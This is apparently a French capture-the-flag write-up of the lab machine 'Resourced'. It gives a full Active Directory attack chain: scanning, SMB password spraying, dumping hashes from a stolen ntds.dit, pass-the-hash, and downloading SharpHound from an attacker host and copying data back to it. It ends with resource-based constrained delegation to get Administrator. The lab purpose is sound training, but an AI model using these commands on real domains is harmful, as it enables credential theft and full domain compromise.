# Resourced

	sudo  masscan -p1-65535,U:1-65535 192.168.184.175 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.184.175 -oN nmap.txt
	
Scans classiques.

	PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-25 17:23:21Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    3389/tcp  open  ms-wbt-server Microsoft Terminal Services
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    9389/tcp  open  mc-nmf        .NET Message Framing
    49666/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49671/tcp open  msrpc         Microsoft Windows RPC

En énumérant le SMB on récupère une grosse quantité d'utilisateurs dont un qui a son mot de passe en description parce qu'il vient d'arriver, mais j'ai décidé de faire une liste et de faire du password spraying pour tout vérifier : 

	enum4linux 192.168.184.175 | tee resultat.txt
	cat resultat.txt | grep "has member: resourced" | cut -d'\' -f 2 | sort -u > users.txt
	for nom in `cat  users.txt` ; do  smbclient -L //192.168.184.175/ -U $nom%'HotelCalifornia194!' -N ; done

Il n'y a bien que V.Ventz qui fonctionne. En revanche on voit un partage très intéressant : **Password Audit Disk**

    Sharename Type Comment  
    --------- ---- -------  
    ADMIN$ Disk Remote Admin  
    C$ Disk Default share  
    IPC$ IPC Remote IPC  
    NETLOGON Disk Logon server share  
    Password Audit Disk
    SYSVOL Disk Logon server share

Téléchargement de tous les fichiers dans le partage : 

    smbclient //192.168.184.175/'Password Audit'  -U V.Ventz%'HotelCalifornia194!'
    smb: \> mask ""  
	smb: \> recurse ON  
	smb: \> prompt OFF  
	smb: \> mget *
   
Résultat : 

	Active Directory  
	├── ntds.dit  
	└── ntds.jfm  
	registry  
	├── SECURITY  
	└── SYSTEM

Exploitation des fichiers et extraction des hashs : 

	impacket-secretsdump -ntds "Active Directory"/ntds.dit -system registry/SYSTEM LOCAL > dump.txt
	cat dump.txt | grep ":::" | cut -d: -f1,4 > hashs.txt

Finalement j'ai directement essayé chaque paire utilisateur / hash manuellement mais on aurait pu automatiser le processus avec CrackMapExec. La seule paire qui a fonctionné est L.Livingstone / 19a3a7550ce8c505c2d46b5e39d6f808 : 

	evil-winrm -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808 -i 192.168.184.175
    type C:\Users\L.Livingstone\Desktop\local.txt

Pivoting et élévation de privilèges : 

	iwr -Uri http://192.168.45.229/SharpHound.ps1 -Outfile .\SharpHound.ps1
	Import-Module ./SharpHound.ps1
	Invoke-BloodHound -CollectionMethod All
	net use * \\192.168.45.229\SMB
	Copy-Item 20230626004631_BloodHound.zip Z:\
	...
	impacket-smbserver smb ~/SMB -smb2support -debug
	sudo neo4j start
	bloodhound

Sur les graphes de BloodHound on remarque que notre utilisateur a les droits "CanRDP", "CanPSRemote" et "GenericAll" sur le contrôleur de domaine. Le dernier est très intéressant et ouvre des possibilités pour des attaques de type "Resource-based Constrained Delegation" notamment. On va pouvoir créer une autre machine, modifier son attribut **"msDS-AllowedToActOnBehalfOfOtherIdentity"** et usurper un administrateur pour obtenir son ticket Kerberos, que l'on utilisera pour se connecter au DC. 

Voir cet article : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation

	impacket-addcomputer RESOURCED.LOCAL/L.Livingstone -dc-ip 192.168.184.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'CIBLE$' -computer-pass 'Mdp123'
	
	python3 rbcd.py -dc-ip 192.168.184.175 -t RESOURCEDC -f 'CIBLE' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 RESOURCED\\L.Livingstone
	
	impacket-getST -spn CIFS/resourcedc.resourced.local RESOURCED/Cible\$:'Mdp123' -impersonate Administrator -dc-ip 192.168.184.175
	
	export KRB5CCNAME=./Administrator.ccache
	
	echo "192.168.184.175 resourcedc.resourced.local" >> /etc/hosts
	
	impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.184.175

	type C:\Users\Administrator\Desktop\proof.txt
 
